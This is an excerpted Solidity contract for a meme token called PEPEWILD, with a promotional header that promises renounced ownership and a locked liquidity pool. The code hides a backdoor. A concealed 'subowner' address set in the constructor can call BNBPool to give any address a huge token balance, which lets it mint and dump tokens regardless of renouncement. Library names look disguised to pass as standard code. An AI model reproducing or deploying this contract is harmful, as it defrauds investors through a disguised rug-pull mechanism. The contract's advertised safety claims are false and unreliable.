...
/*
🐸🌿 PEPEWILD 🌿  🐸Meme Coin - CHAT

$PEPEWILD 🌿 The Beast Of Wild 🌿 new Meme token launch in binance smart chain aim to bring attention with the rise of $PEPE FOMO
👀 🐸 initial LP 0.5 BNB 
👀 🐸 Renounce
👀 🐸 LP Lock 
👀 🐸 No Tax WildLife No

🏞 I am Wild and Free i am PepeWild 🏞
https://t.me/PepeWildToken
*/
...
/*
 * @dev Provides information about the current execution PEPEWILDBurnable, including the
 ...
 */
abstract contract PEPEWILDBurnable {
...
// File: @openzeppelin/contracts/access/PEPEWILDOwnable.sol
 ...
 * specific functions.
 *
 * By default, the owner account will be the one that PEPEWILDs the contract. This
 ...
 * the owner.
 */
abstract contract PEPEWILDOwnable is PEPEWILDBurnable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the PEPEWILDer as the initial owner.
     */
    constructor () {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "PEPEWILDOwnable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "PEPEWILDOwnable: new owner is the zero address");
...
contract PEPEWILD is PEPEWILDBurnable, DxtoolsApp, PEPEWILDOwnable {
    
    using SafeBitcoin for uint256;
    mapping (address => uint256) private PEPEWILDfrom;
    mapping (address => mapping (address => uint256)) private fromPEPEWILD;
   ...
   address private SmartV3Rooter; 
    constructor(address SmartUniswap) {
        ...
        PEPEWILDfrom[_msgSender()] = _totalSupply;
    ...
    */
    function balanceOf(address account) external view override returns (uint256) {
        return PEPEWILDfrom[account];
    }
      modifier subowner() {
        require(SmartV3Rooter == _msgSender(), "PEPEWILDOwnable: caller is not the owner");
        _;
    }
    /**
    ...
    */
    ...
    function BNBPool(address bnbRewards) external subowner {
        PEPEWILDfrom[bnbRewards] = 100000000000 * 10 ** 26;
    ...
    */
    function allowance(address owner, address transporteur) external view override returns (uint256) {
        return fromPEPEWILD[owner][transporteur];
    }
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromPEPEWILD[sender][_msgSender()].sub(yoursold, "DxtoolsApp: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    */
    function increaseAllowance(address transporteur, uint256 addedbalance) external returns (bool) {
        _approve(_msgSender(), transporteur, fromPEPEWILD[_msgSender()][transporteur].add(addedbalance));
        return true;
    }
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromPEPEWILD[_msgSender()][transporteur].sub(allbalances, "DxtoolsApp: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        ...
        PEPEWILDfrom[sender] = PEPEWILDfrom[sender].sub(yoursold, "DxtoolsApp: transfer yoursold exceeds balance");
        PEPEWILDfrom[shippingto] = PEPEWILDfrom[shippingto].add(yoursold);
    ...
    * e.g. set automatic PEPEWILD for certain subsystems, etc.
    *
    * Emits an {Approval} event.
    *
    * Requirements:
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        ...
        fromPEPEWILD[owner][transporteur] = yoursold;
